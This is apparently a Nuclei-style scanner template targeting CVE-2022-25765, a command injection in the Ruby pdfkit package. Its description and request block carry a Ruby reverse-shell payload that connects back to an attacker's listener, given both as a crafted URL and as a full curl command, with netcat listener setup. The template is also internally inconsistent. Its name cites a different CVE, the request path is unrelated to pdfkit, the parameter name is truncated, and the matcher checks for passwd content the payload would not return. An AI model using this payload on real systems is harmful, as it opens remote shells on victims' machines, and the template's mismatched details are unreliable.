id: CVE-2022-25765_51pwn_api
info:
  name: CVE-2022-2414_51pwn_api
  author:
  - 51pwn
  severity: Critical
  description: |-
    pdfkit <0.8.6 command injection shell. The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.
    (Tested on ver 0.8.6) - CVE-2022-25765
    Pre-reqs:

    Setup HTTP Server - python3 -m http.server
    Setup Netcat Listener - nc -lvnp 4444
    Reverse Ruby Shell via webpage: http://LOCAL-IP:LOCAL-HTTP-PORT/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("LOCAL-IP",LOCAL-LISTEN-PORT))')

    Via CURL (modify bold values): curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
  tags: api,web,pdf

variables:
  MyIp: 169.254.254.254
  MyPort: 4444
requests:
  - raw:
      - |
        POST /ca/rest/certrequests HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}
        Upgrade-Insecure-Requests: 1
        Connection: keep-alive

        rl=http%3A%2F%2F{{MyIp}}%3A{{MyPort}}%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22{{MyIp}}%22%2C{{MyPort}}%29%29%27%60
        
    matchers:
      - type: word
        condition: and
        part: body
        words:
        - 'root:*:0:0:'
    matchers-condition: and
    redirects: false
  